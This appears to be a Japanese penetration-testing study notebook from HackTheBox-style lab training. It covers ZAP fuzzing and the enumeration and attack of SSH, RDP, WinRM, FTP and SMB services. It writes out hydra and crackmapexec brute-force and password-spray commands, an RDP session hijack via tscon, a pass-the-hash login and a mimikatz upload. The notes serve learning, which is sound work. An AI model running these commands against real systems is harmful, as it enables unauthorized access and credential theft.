- リクエスト送信前に自動でURLエンコードされる（手動で見ることは少ない）
- `CTRL+E` → `Encoder/Decoder/Hash` ツールを使用
- 「Decode」タブでは自動で各種デコーダを試してくれる
- 「Add New Tab」で好きなエンコーダ／デコーダを追加できる

**ZAP Fuzzerの使い方**

- ZAP Fuzzerとは？
	- OWASP ZAPに内蔵されたファジングツール
	- Burp Intruderほど高機能ではないが、無料＆高速
	- スレッド数の調整ができ、速度制限なし（無料でも快適）

- 基本的な使い方
	- ターゲットにアクセス（例：http://TARGET/test/）
	- Proxy Historyからリクエストを右クリック → Attack > Fuzz

- 設定ステップ
	- Fuzz Location（差し込み位置）
		- URLの一部（例：test）を選択し、Addボタンで差し込み位置に設定
	- Payloads（ワードリスト）
		- Addを押してPayload Typeを選択
			- File：任意のワードリストファイルを選択
			- File Fuzzers：ZAP内蔵のワードリスト（例：dirbuster）を選べる
		- dirbusterのリストを選べばOK（別途用意不要）
	- Processors（加工処理）
		- URL Encode：特殊文字を含むパスに対応（サーバーエラー防止）
		- その他：Prefix/Postfix、Base64、ハッシュ化など多様に対応
	- Options（設定）
		- Concurrent threads per scan：20などに設定してスピードアップ
		- Depth First / Breadth First：必要に応じて切り替え（今回はDepthでOK）

- 実行と結果確認
	- Start Fuzzer ボタンを押して攻撃開始
	- 結果画面で「Response code」で並び替え → 200 OKを探す
	- 200 OK = 存在するディレクトリ or ページ

- 攻撃者視点での注目ポイント
	- skills というパスが200 OK → 存在している
	- Response Bodyのサイズが他と違えば、特別な内容の可能性あり
	- RTT（応答時間）にも注目 → タイムベース攻撃の検出にも使える

- ZAP Fuzzerのメリット
	- 完全無料、速度制限なし
	- 内蔵ワードリストが豊富（マーケットプレイスから追加可能）
	- GUIで操作できるため、非エンジニアでも扱いやすい

- Burpとの比較ポイント
	- Burp Intruder（無料版）は1秒1リクエストの制限がネック
	- ZAPは無料でもマルチスレッド＆ワードリスト豊富で快適
	- 高度な制御・細かいマッチングはBurpの方が強い（Pro版前提）

**ZAP Scannerまとめ**

- 機能構成
	- Spider：リンクをたどってサイト構造を把握
	- Passive Scanner：既存レスポンスから脆弱性を自動検出
	- Active Scanner：リクエストを送信して実際に攻撃を試みる

- 実行方法
	- History > 右クリック > Spider / Active Scan
	- HUDのボタンでも操作可能（環境により不安定な場合あり）

- 注目ポイント（攻撃者視点）
	- Alertsの「High」レベル：深刻な脆弱性（XSS, SQLi, OSコマンド等）
	- 詳細を見ると、リクエスト＆レスポンスが確認できる
	- パッシブは瞬時、アクティブは時間がかかるがより正確

- レポート活用
	- HTML, XML, Markdownで出力可能
	- 再現手順や修正アドバイスも含まれる
	- 学習ログや調査記録として便利

**ZAPの拡張（Marketplace）**
- Manage Add-ons → Marketplaceタブから追加
- 安定版（Release）と実験版（Beta/Alpha）がある
- 例：FuzzDB Files / FuzzDB Offensive を追加
	- 多数のペイロードやワードリストが利用可能に
	- 特にOSコマンドインジェクション攻撃で活躍
- ファザー実行時にワードリストとして選べるようになる

## SSH
- `SSH-1`と`SSH-2`がある
	- `SSH-2`、SSHバージョン2としても知られており、暗号化、速度、安定性、およびセキュリティにおいて、SSHバージョン1よりも高度なプロトコル
		- たとえば、`SSH-1`は`MITM`攻撃に対して脆弱ですが、SSH-2は脆弱ではない
6つの認証方法
	1. パスワード認証
	2. 公開鍵認証
	3. ホストベースの認証
	4. キーボード認証
	5. チャレンジレスポンス認証
	6. GSSAPI認証
### デフォルト設定
- [sshd_config](https://www.ssh.com/academy/ssh/sshd_config)ファイルには、デフォルトで設定されている設定はわずか
	- ただし、デフォルトの構成には、2016 年の OpenSSH のバージョン 7.2p1 のコマンド インジェクションの脆弱性を含む X11 転送が含まれている
```shell-session
cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
```

### 危険な設定
パスワード認証を許可すると、既知のユーザー名を可能なパスワードにブルートフォースできる

| **設定**                       | **説明**                      |
| ---------------------------- | --------------------------- |
| `PasswordAuthentication yes` | パスワードベースの認証を許可します。          |
| `PermitEmptyPasswords yes`   | 空のパスワードの使用を許可します。           |
| `PermitRootLogin yes`        | ルートユーザーとしてログインできます。         |
| `Protocol 1`                 | 古いバージョンの暗号化を使用します。          |
| `X11Forwarding yes`          | GUI アプリケーションの X11 転送を許可します。 |
| `AllowTcpForwarding yes`     | TCPポートの転送を許可します。            |
| `PermitTunnel`               | トンネル掘削を許可します。               |
| `DebianBanner yes`           | ログイン時に特定のバナーを表示します。         |

### 情報収集(コマンド)

- SSHサーバーの情報収集として、 [ssh-audit](https://github.com/jtesta/ssh-audit)というツールが使える
	- クライアント側とサーバー側の構成をチェックし、いくつかの一般的な情報と、クライアントとサーバーでまだ使用されている暗号化アルゴリズムを表示する
	- これは後で不可解なレベルでサーバーまたはクライアントを攻撃することで悪用される可能性がある
ssh-audit
```shell-session
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
```

```shell-session
./ssh-audit.py 10.129.14.132
```

**脆弱性を利用した攻撃**
- [CVE-2020-14145](https://www.cvedetails.com/cve/CVE-2020-14145/)などの脆弱性があり、攻撃者は中間者になり、最初の接続の試みを攻撃することができる
- OpenSSHサーバーとの接続設定の詳細な出力は、サーバーが使用できる認証方法など、重要な情報を提供することがよくある
- 潜在的なブルートフォース攻撃の場合、SSHクライアントオプション`PreferredAuthentications`を使用して認証方法を指定できる
```shell-session
ssh -v <ユーザー名>@$Target_IP -o PreferredAuthentications=password
```

**パスワード攻撃**
hydraを使用した辞書攻撃
```shell-session
hydra -L user.list -P password.list ssh://$Target_IP -v
```
- 単一のユーザー名を指定する場合は、小文字の「-l」を使う

例 : samというユーザー名のみでブルートフォース
```sh
hydra -l sam -P mut_password.list ssh://$Target_IP -v
```

## Rsync

- Rsyncは、高速かつ効率的にローカルおよびリモートでファイルをコピーできるツール
- ローカル環境内のコピーはもちろん、リモートホストとの間でファイルをやり取りすることも可能
- デルタアルゴリズムにより、宛先側に既に存在するファイルのバージョンがある場合、変更差分だけを送信することでネットワーク転送量を削減する
	- 主にバックアップやミラーリングの用途で利用されることが多いです。
	- Rsyncはファイルのサイズや最終更新日時が変化したかどうかを確認し、転送が必要なファイルを判断します
- デフォルトではポート873を使用しますが、既存のSSHサーバー接続に乗せる形で、SSHによる安全なファイル転送を行うよう設定することもできる

### 情報収集(コマンド)
何が公開されているのかを調べる
```shell-session
nc -nv $Target_IP 873
```

`dev`という公開されているリソースにアクセスして列挙する
```shell-session
rsync -av --list-only rsync://127.0.0.1/dev
```

- SSHキーが含まれている可能性のあるディレクトリにアクセスできれば、sshで接続できる
以下のコマンドで、/devの中のファイルを全部自分で持つことができる
```shell-session
rsync -av rsync://$Target_IP/dev
```
- Rsyncがファイル転送にSSHを使用するよう設定されている場合は、コマンドに `-e ssh` フラグや、SSHが標準外のポートで動作している場合は `-e "ssh -p2222"` のように指定できる
	- 詳しくは、[guide](https://phoenixnap.com/kb/how-to-rsync-over-ssh)に書いてある


### R-Services
- TCP/IPを介してUnixホスト間でリモートアクセスを有効にしたり、コマンドを発行したりするためにホストされている一連のサービス
- 固有のセキュリティ欠陥のためにセキュアシェル`SSH`に置き換えられるまで、Unixオペレーティングシステム間のリモートアクセスの事実上の標準だった
	- MITMができちゃうのね
- `R-services`ポート`512`、`513`、および`514`にまたがり、`r-commands`と呼ばれる一連のプログラムを介してのみアクセスできる
	- Solaris、HP-UX、AIXなどの商用オペレーティングシステムで最も一般的に使用されていた
	- ペネトレの時もたまに出てくるので使い方を知っておく必要がある

### デフォルトの設定
R-Servicesの時に使うコマンド一覧
- rcp (`remote copy`)
- rexec (`remote execution`)
- rlogin (`remote login`)
- rsh (`remote shell`)
- rstat
- ruptime
- rwho (`remote who`)

最もよく使うコマンド

|    コマンド    |  サービス デーモン  | ポート | トランスポート プロトコル | 説明                                                                                                                                          |
| :--------: | :---------: | :-: | :-----------: | :------------------------------------------------------------------------------------------------------------------------------------------ |
|  **rcp**   |  **rshd**   | 514 |      TCP      | ローカルシステムからリモートシステムへ、あるいはその逆、またはリモートシステム間でファイルやディレクトリを双方向にコピーする<br>Linux の cp コマンドのように動作しますが、既存のファイルを上書きしてもユーザーに警告しない                        |
|  **rsh**   |  **rshd**   | 514 |      TCP      | リモートマシン上にログイン手続きを行わずにシェルを開く<br>検証には /etc/hosts.equiv と .rhosts ファイルの信頼エントリを使用する                                                             |
| **rexec**  | **rexecd**  | 512 |      TCP      | ユーザーがリモートマシン上でシェルコマンドを実行できるようにする<br>暗号化されていないネットワークソケットを介し、ユーザー名とパスワードによる認証が必要<br>認証は /etc/hosts.equiv と .rhosts ファイルの信頼エントリにより上書きされる可能性がある |
| **rlogin** | **rlogind** | 513 |      TCP      | ユーザーがネットワーク越しにリモートホストへログインできるようにする<br>telnet に似ていますが、Unix 系ホストにのみ接続可能・認証は /etc/hosts.equiv と .rhosts ファイルの信頼エントリにより上書きされる可能性がある             |

- 信頼できるホストのリストが含まれており、ネットワーク上の他のシステムへのアクセスを許可するために使用される
	- ファイルとしては、`/etc/hosts.equiv`とか`.rhosts`とか
	- これらのホストのいずれかのユーザーがシステムにアクセスしようとすると、それ以上の認証なしで自動的にアクセスが許可される
- 注：/etc/hosts.equiv は、システム上のすべてのユーザーに対するグローバル設定として認識されるのに対し、.rhosts はユーザー単位の設定として扱われます。  
```shell-session
cat /etc/hosts.equiv
```

こんな感じで信用するホストのIPが書かれている
{username} {ip address}
+はワイルドカードを示す

```shell-session
snowyowl644@htb[/htb]$ cat .rhosts

htb-student     10.0.17.5
+               10.0.17.10
+               +
```

### 情報の収集(コマンド)
Nmapでのスキャン
```shell-session
 sudo nmap -sV -p 512,513,514 10.0.17.2
```

ログイン
```shell-session
rlogin $Target_IP -l <username>
```

Rwhoコマンドで認証されたユーザーを一覧表示する
```shell-session
snowyowl644@htb[/htb]$ rwho

root     web01:pts/0 Dec  2 21:34
htb-student     workstn01:tty1  Dec  2 19:57  2:25       
```

Rusersコマンドで、認証されたユーザーをリストとして表示する
```shell-session
 rusers -al $Target_IP
```


## RDP
- Windowsオペレーティングシステムを実行しているコンピューターへのリモートアクセスのためにMicrosoftによって開発されたプロトコル
- デフォルトで`TCP port 3389`を使用
- このプロトコルにより、IPネットワークを介して暗号化されたGUIを介して表示および制御コマンドを送信できる
- Windows Vista以降、TLS/SSLで暗号化されている
- `Server Manager`を使用してアクティブ化でき、[ネットワークレベル認証](https://en.wikipedia.org/wiki/Network_Level_Authentication)（`NLA`）を持つホストのみへのサービスへの接続を許可するデフォルト設定が付属している
- **RDPでファイル共有すれば、ファイルを送れる！！**

### 情報収集(コマンド)
**nmapでのスキャン**
```shell-session
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```

**RDPのセキュリティチェック**
- [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) は、[rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) という名前の Perl スクリプトを開発している
- ハンドシェイクに基づいて RDP サーバーのセキュリティ設定を非正規に識別できる
```shell-session
sudo cpan
```

**rdp-sec-checkを用いたセキュリティチェック**
```shell-session
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl 10.129.201.248
```

**RDPのセッションの開始**
- xfreerdp以外にも[Remmina](https://remmina.org/)、[rdesktop](http://www.rdesktop.org/)を使える
```shell-session
xfreerdp /u:<ユーザー名> /p:"<パスワード>" /v:$Target_IP /cert:ignore
```

```shell-session
xfreerdp /u: /p: /v: /cert:ignore
```

認証情報があっているのにエラーが出て、接続できない場合は、以下のオプションをつけると接続できるかも
1. `/sec:rdp`
	- **NLA (Network Level Authentication) を無効化** し、通常の RDP 認証を使用する。
	- これにより、サーバー側で `NLA` に問題があっても接続できるようになった。
2. `+sec-nla`
	- **手動で NLA を有効化** し、NLA 認証を試みる。
	- `/sec:rdp` によって通常の RDP 認証が有効になりつつ、`+sec-nla` で NLA もサポートされるため、サーバーとの相性が良くなった。

#### ブルートフォース
ベーシックな、ユーザーネームとパスワードリストを両方使うやり方
```shell-session
hydra -L user.list -P password.list rdp://$Target_IP
```

パスワードスプレー攻撃
- ターゲットがWindowsとかの場合、同じユーザーに対して、何回もパスワードを試すと、アカウントがロックされることがある。
- なので、逆にパスワードを固定して、ユーザー名で当てはまるものがないかを探す攻撃をパスワード攻撃という

crowbar
```shell-session
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

hydra
```shell-session
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

#### セッションハイジャック
**前提**
- マシンへのアクセスに成功し、ローカル管理者権限を持つアカウントを持っている状態
- 他のユーザーも自分と同じようにRDPセッションで接続している
**目標**
- 特権ユーザーのRDPセッションをハイジャックする

**前提の確認**
- Powershellで`query user`で誰が何で接続しているかを確認する

**セッションの乗っ取り -準備**
- パスワードを知らなくてもユーザーになりすますには、SYSTEM 権限で、 Microsoft の tscon.exe バイナリを使用する
`tscon.exe`の構文
```sh
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

例
```sh
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

**セッションの乗っ取り -実行**
実際に乗っ取るには、`sessionhijack`を実行する
```sh
C:\htb> net start sessionhijack
```

#### PtH攻撃
[[Windows Local Password Attack]]の"横展開"の"PtH(Pass the Hash)"の"RDPでハッシュを渡す"に記載
**前提**
- SAMデータベースなどからの認証情報ダンプ攻撃で得たユーザーのNTハッシュを所持している
	- ハッシュから平文のパスワードを解読できない



## WinRM
- ポート5985と5986を使用、デフォルトだと
- ポート47001が使われていることもよくあるそう
- コマンドラインに基づくシンプルなWindows統合リモート管理プロトコル
- WinRMは、Simple Object Access Protocol（`SOAP`）を使用して、リモートホストとそのアプリケーションへの接続を確立する
- Windows 10 から WinRM を明示的に有効にして設定する必要がある
### 情報収集(コマンド)
Nmapでのスキャン
```shell-session
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```

Linuxベースの環境では、WinRMと対話するために設計された別の侵入テストツールである[evil-winrm](https://github.com/Hackplayers/evil-winrm)と呼ばれるツールを使用できる
```shell-session
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```

### Evil-WinRM
uploadの後に、攻撃元のファイルパスを指定すると送ることができる
```sh
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/snowyowl644/mimikatz-master/x64/mimikatz.exe
                                        
Info: Uploading /home/snowyowl644/mimikatz-master/x64/mimikatz.exe to C:\Users\Administrator\Documents\mimikatz.exe
                                        
Data: 1666740 bytes of 1666740 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```



## WMI
- Windows Management Instrumentation
- Microsoft の実装であり、Windows プラットフォーム用の標準化された Web ベースのエンタープライズ管理 (`WBEM`) の中核機能である Common Information Model (`CIM`) の拡張でもある
- WMI は、Windows システムのほぼすべての設定への読み取りおよび書き込みアクセスを可能にする
- WMI は通常、PowerShell、VBScript、または Windows Management Instrumentation Console (`WMIC`) を介してアクセスされる

### 情報収集(コマンド)
- WMI通信の初期化は常に`TCP`ポート`135`で行われ、接続の確立が成功した後、通信はランダムなポートに移動する
	- Impacketツールキットのプログラム[wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)を使える
```shell-session
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```


## Microsoft ASP.NET Framework
.NET上で動的Webアプリケーションを開発・実行するためのサーバーサイドフレームワーク

- .NET ランタイム上で動作
    - Windows 上の **.NET Framework**(4.x 系) を使って、C# や VB.NET など .NET 対応言語を用いて Web アプリを開発・動作させる。
- サーバーサイドで動的ページを生成
    - **`.aspx`** (ASP.NET Webフォーム) や **`.ascx`** (ユーザーコントロール) を通じて、動的に HTML を組み立てブラウザへ返す仕組み。
- IIS (Internet Information Services) と連携
    - Windows Server（または Windows クライアント）の **IIS** 上でホストするのが主流。IIS が **`.aspx`** などを受け取ると、ASP.NET ランタイムへ処理を回す。
- .aspxが動いている
### 情報収集(コマンド)
- このサービスが動いていると言うことは、webサーバーが去っているので、徹底的に調べる
	- どこかにファイルアップロードの機能がないか・アップロードしたファイルにアクセスできないかを調べる
	- .aspxのwebshell・Antak-WebShellを設置することができるかも
	- 詳しくは下のwebshellで


## WinRM
- [Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)（`WinRM`）は、ネットワークプロトコル[Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol)（`WS-Management`）のMicrosoft実装
- ポート47001は通常、WinRMのバックエンド用HTTPAPI
- PowerShell Remotingの入口（5985/5986）とは異なる場合が多い
- 47001 が空いていても、evil-winrm の接続先ではない可能性もある
	- Windowsシステムのリモート管理に使用される[Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary)（`SOAP`）を使用したXML Webサービスに基づくネットワークプロトコル
		- SOAP
			- XMLを用いたメッセージ形式で、Webサービスのやり取りをするためのプロトコル
			- HTTPをトランスポートとして利用することが多く、WS-Managementのベース技術にもなっている
			- Linux側でもSOAPライブラリが多数あり、Webサービス間のやり取りに使用
	- [Web ベースのエンタープライズ管理](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) と、[分散コンポーネント オブジェクト モデル](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`) を呼び出すことができる [Windows 管理インスツルメンテーション](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`) の間の通信を処理する
		- WBEM
			- DMTFによって標準化された管理仕様で、分散環境のシステム管理を容易にするためのフレームワーク
			- WindowsではWMIがWBEMを利用している
		- DCOM
			- マイクロソフトのCOMをネットワーク越しに拡張した分散オブジェクト技術
			- Windows環境での分散アプリケーション開発や管理に使われる
		- WMI
			- Windowsの管理を自動化するためのフレームワークで、WBEMやDCOMなどを使い各種APIを呼び出す
			- システムの状態取得や管理操作をスクリプトやプログラムから行える

	- WinRM は Windows 10 で手動でアクティブ化および設定する必要あり
	- WinRM を使用するドメインまたはローカル ネットワークの環境セキュリティに大きく依存する
	- ほとんどの場合、セキュリティを強化するために、証明書または特定の認証メカニズムのみを使用する
	- WinRM は TCP ポート 5985 (HTTP) および 5986 (HTTPS) を使用する
### 情報収集(コマンド)
WinRMでは基本的に認証済みのアカウントを使うことで、システム情報の取得とか、コマンドの実行が可能
そのため、HTBでWinRMを使おうと思ったら、まずは有効なアカウント情報を取得しないといけない
#### 接続
WinRM用ツール
```shell-session
sudo gem install evil-winrm
```

もしWinRMの設定が誤っていて匿名アクセスが許可されていたり、簡単に推測できるアカウント情報が登録されていたりする場合は、認証なしや低い権限で情報取得ができることもある
無認証の場合
```sh
evil-winrm -i $Target_IP -u '' -p ''
```

それぞれの認証情報がわかっている場合
- ログインが成功した場合、ターミナルセッションは[Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec)（`MS-PSRP`）を使用して初期化され、コマンドの操作と実行ができる
```shell-session
evil-winrm -i $Target_IP -u <username> -p <password>
```

evil-winrmは、ハッシュでもログインできる
- ハッシュがクラックできなくても大丈夫
```sh
evil-winrm -i <TARGET_IP> -u Administrator -H 4c827b7074e99eefd49d05872185f7f8
```
#### パスワード攻撃
- パスワード攻撃に使用できるツールとして、CrackMapExecがある。
```shell-session
sudo apt-get -y install crackmapexec
```
- CrackMapExecは現在、MSSQL、SMB、SSH、およびWinRMを使用したリモート認証をサポートしている

一般的な形式
```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

WinRMで、ユーザー名リストとパスワードリストを使って、パスワード攻撃を行う時のコマンド
- (Pwn3d!)って出てきたら、その時の認証情報でアクセスできる可能性が高い
```shell-session
crackmapexec winrm $Target_IP -u user.list -p password.list
```



## FTP
- FTPでは、TCP20,21を使う
	- まず、クライアントとサーバーが`TCP port 21`で制御チャネルを確立する
	- 次に、`TCP port 21`を介して制御チャネルを確立する
	- そして、`TCP port 20`を介してデータチャネルを確立する


### TFTP
- FTPクライアントとは異なり、`TFTP`にはディレクトリリスト機能はない
- FTPにあるような認証はないので、TFTP はローカルおよび保護されたネットワークでのみ使用できる

| コマンド      | 説明                                                            |
| --------- | ------------------------------------------------------------- |
| `connect` | ファイル転送用のリモートホスト、オプションでポートを設定します。                              |
| `get`     | リモートホストからローカルホストにファイルまたはファイルセットを転送します。                        |
| `put`     | ローカルホストからリモートホストにファイルまたはファイルセットを転送します。                        |
| `quit`    | tftpを終了します。                                                   |
| `status`  | 現在の転送モード（asciiまたはバイナリ）、接続ステータス、タイムアウト値など、tftpの現在のステータスを表示します。 |
| `verbose` | 冗長モードをオンにします。これにより、ファイル転送中に追加情報が表示されます。オンまたはオフになります。          |

### vsFTPd
- Linuxベースのディストリビューションで、一番多く使われてる
- vsFTPdのデフォルト設定は`/etc/vsftpd.conf`にある
- FTPユーザーファイル
```shell-session
cat /etc/ftpusers
```
- vsFTPdサーバーに接続するとすぐに、FTPサーバーのバナー
	- `service`説明とその`version`が含まれている
	- FTPサーバーのシステムの種類
- サーバーの設定の概要を取得するコマンド
	- status
	- debug
	- trace
	- ls
	- ls -R
		- 再帰的リスト
	- `wget -m --no-passive ftp://anonymous:anonymous@$Target_IP`
		- 利用可能なすべてのファイルをダウンロード
		- ターゲットのIPアドレスの名前を含むディレクトリを作成して保存される
	- put `FILE`
		- 現在のフォルダ内のファイルをFTPサーバーにアップロードできる
### 情報収集(コマンド)

### FTP匿名ログイン

```bash
ftp -p $Target_IP
```

- ユーザー名: `anonymous` または `ftp`
- パスワード: 空欄でEnter

- FTPのNmapスクリプトをまとめて実行
```shell-session
find / -type f -name ftp* 2>/dev/null | grep scripts
sudo nmap -sCV -A -Pn -p21 -vv $Target_IP --script "/usr/share/nmap/scripts/ftp*.nse"
```
- `ftp-anon` NSEスクリプト: FTPサーバーが匿名アクセスを許可しているかどうかを確認する
    - 匿名アクセスが許可されている場合は、匿名ユーザーが見られるFTPルートディレクトリの内容を表示
- `ftp-syst` NSEスクリプト: STATコマンドを実行し、FTPサーバーのステータス、構成、バージョンなどの情報を取得する

### TLS/SSL暗号化されたFTPサーバーの場合
- TLS/SSLに対応したクライアントが必要となる
- opensslクライアントを使用することで、FTPサーバーと通信が可能
- opensslを使えばSSL証明書を確認できるため、追加の情報収集にも役立つ
- SSL証明書により、たとえば`hostname`を認識でき、ほとんどの場合、組織または会社の`email address`もわかる
```shell-session
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

### ブルートフォース
```sh
crackmapexec ftp $Target_IP -u user.list -p password.list --local-auth
```

```sh
hydra -L users.list -P passwords.list ftp://$Target_IP:21 -t 64
```
### FTPバウンス攻撃
- **FTPサーバーを中継（プロキシ）として利用し、別のターゲットに対して攻撃やスキャンを行う手法**
	- 攻撃者が直接ターゲットに接続せずに、FTPサーバーを経由して攻撃する
	- ネットワーク内の非公開サーバー（内部サーバー）にもアクセスできる可能性がある
	- 攻撃元（攻撃者）のIPアドレスを隠すことができる
- 攻撃者は PORT コマンドを悪用し、FTPサーバーに対して本来意図しないデバイスとの通信を強制する
**流れ**
1. 攻撃者はFTPサーバーにログイン（匿名アカウントを使用可能な場合もある）
2. PORTコマンドを利用して、攻撃者が指定したIPアドレス（ターゲット）とポートへデータを送信させる
3. FTPサーバーがターゲットへパケットを送信
4. 攻撃者は応答を解析し、ターゲットのポートスキャンや攻撃に利用
- 例 : インターネットに公開された FTP_DMZ サーバーがあり、同じネットワーク内に外部から直接アクセスできない Internal_DMZ サーバーがあるとする
- 攻撃者は FTP_DMZ を経由して Internal_DMZ にスキャンを仕掛け、開いているポートを確認できる

**Nmapを使ったポートスキャンとしてのFTPバウンス利用**
- FTPサーバー（10.10.110.213）を経由して、ターゲット（172.17.0.2）の80番ポートをスキャンする
```sh
nmap -Pn -v -n -p<ポート番号> -b <FTPサーバーの認証情報>@<FTPサーバーのIP> <ターゲットのIP>
```
現代のFTPサーバーには、この種の攻撃を防ぐための保護機能が備わっています。しかし、適切に設定されていない場合、依然として攻撃が成功する可能性がある


## Samba(SMB)
- 概要
    - UNIXやLinuxでSMBを利用するためのオープンソースソフトウェア
    1. Windowsのファイル共有やプリンタ共有と同等の機能を提供する
    2. ドメインコントローラ機能を提供することも可能
2. SMBの役割と特徴
    
    1. ローカルネットワーク内でクライアントとサーバー間のファイルやプリンタを共有するプロトコル
    2. Windows環境でフォルダの共有や印刷サービスを実装するために用いられる
    3. “SMB/CIFS”と呼ばれることもあり、新旧Windows環境間でも下位互換がある
3. NetBIOS環境での名前解決
    
    1. 各ホストはNetBIOS名を持ち、通信時にはその名前が使われる
    2. WINS(Windows Internet Name Service)などで名前登録や解決を行う
4. SambaとSMBの関係
    
    1. SMBのオープンソース実装がSamba
    2. Windows以外のUNIX/Linux環境でもファイル共有を実現できる
5. ポートとサービス名
    
    1. ポート139/tcp(netbios-ssn)と445/tcp(microsoft-ds)を利用する
    2. nmapでは「netbios-ssn」や「microsoft-ds」の名称で検出されることが多い
    3. これらのポートが開いていればSMBが稼働している可能性が高い

| **SMBバージョン** | **対応OS**                            | **主な機能**                              |
| ------------ | ----------------------------------- | ------------------------------------- |
| CIFS         | Windows NT 4.0                      | NetBIOSインターフェイスを介した通信                 |
| SMB 1.0      | Windows 2000                        | TCPを利用した直接接続                          |
| SMB 2.0      | Windows Vista, Windows Server 2008  | パフォーマンス向上、メッセージ署名の強化、キャッシュ機能          |
| SMB 2.1      | Windows 7, Windows Server 2008 R2   | ロック機構                                 |
| SMB 3.0      | Windows 8, Windows Server 2012      | マルチチャネル接続、エンドツーエンド暗号化、リモートストレージへのアクセス |
| SMB 3.0.2    | Windows 8.1, Windows Server 2012 R2 | （明示的な追加機能情報なし）                        |
| SMB 3.1.1    | Windows 10, Windows Server 2016     | 整合性チェック、AES-128暗号化                    |

### デフォルト設定の把握
```shell-session
snowyowl644@htb[/htb]$ cat /etc/samba/smb.conf | grep -v "#\|\;" 
```
- グローバル設定とプリンター向けの2つの共有が表示される
	- グローバル設定は、すべての共有に使用される利用可能なSMBサーバーの構成
	- 個々の共有では、グローバル設定が上書きされる可能性があり、誤って設定される可能性が高い
### 注目すべき誤った設定

| 設定項目                          | 説明                               |
| ----------------------------- | -------------------------------- |
| **browseable = yes**          | 現在の共有内で利用可能な共有を一覧表示できるようにしますか？   |
| **read only = no**            | ファイルの作成や変更を禁止しますか？               |
| **writable = yes**            | ユーザーにファイルの作成や変更を許可しますか？          |
| **guest ok = yes**            | パスワードなしでこのサービスに接続できるようにしますか？     |
| **enable privileges = yes**   | 特定のSIDに割り当てられた権限を有効にしますか？        |
| **create mask = 0777**        | 新しく作成されるファイルにどのようなアクセス権を設定するか？   |
| **directory mask = 0777**     | 新しく作成されるディレクトリにどのようなアクセス権を設定するか？ |
| **logon script = script.sh**  | ユーザーのログイン時に実行するスクリプトは何か？         |
| **magic script = script.sh**  | スクリプトが終了する際に実行するスクリプトは何か？        |
| **magic output = script.out** | スクリプトの出力を保存するファイルは何か？            |
### 情報収集(コマンド)
### Windows
- `[WINKEY] + [R]`[実行] ダイアログ ボックスを開いて、実行
	- 例:`\\192.168.220.129\Finance\`
#### CMD.exe

NULLセッションの確立
```cmd-session
C:\htb> net use \\DC01\ipc$ "" /u:""
```

認証がない場合は`/user:plaintext Password123`以下はいらない
```cmd-session
net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

`dir \\192.168.220.129\Finance\`

```cmd-session
dir n:\*cred* /s /b
```

### smbclient
**接続**
- `anonymous`ユーザーでアクセスして、サーバーの共有リストを表示する
	- -L : サーバーの共有リスト
	- -N  : 有効なパスワードの入力なしで
 ```shell-session
smbclient -N -L //$Target_IP
```

**特定の共有にアクセス**
```sh
smbclient -N //$Target_IP/Replication
```

- ユーザー名とパスワードを指定してログインする
```sh
smbclient -U <username>%<password> -L //$Target_IP
```
- 上で取得したSharenameのディレクトリに移動する
	- `get`コマンドを使用してファイルやフォルダをダウンロードできる
	- 最初に!を使用してローカルシステムコマンドを実行することもできる（`!<cmd>`)
```shell-session
smbclient //$Target_IP/<Sharename>　--option='client min protocol=SMB2'
```

ユーザーbobとしてログインする
```shell-session
smbclient -U bob \\\\$Target_IP\\users
```

- 管理をするとき、`smbstatus`で接続を確認できる
	- 他の人がまだアクセスできるサブネット（おそらく孤立したもの）に入ったら、特に重要
	- ドメインレベルのセキュリティでは、サンバサーバーはWindowsドメインのメンバーとして機能
	- 各ドメインには、パスワード認証を提供する Windows NT サーバーに少なくとも 1 つのドメイン コントローラーがある
	- ドメインコントローラーは、ワークグループに決定的なパスワードサーバーを提供する
	- ドメインコントローラーは、独自の`NTDS.dit`および`Security Authentication Module`（`SAM`）でユーザーとパスワードでユーザーを認証する
```shell-session
smbstatus
```

SMBからOSのバージョンを検出する
```shell-session
nmap --script smb-os-discovery.nse -p445 $Target_IP
```

SMBの脆弱性スキャン
```shell-session
nmap --script=smb-vuln* -p139,445 $Target_IP
```

ファイルのダウンロードとアップロード
```sh
smbmap -H $Target_IP --download "notes/note.txt"
```

```sh
smbmap -H $Target_IP --upload test.txt "notes/test.txt"
```
### smbmap
匿名ログイン
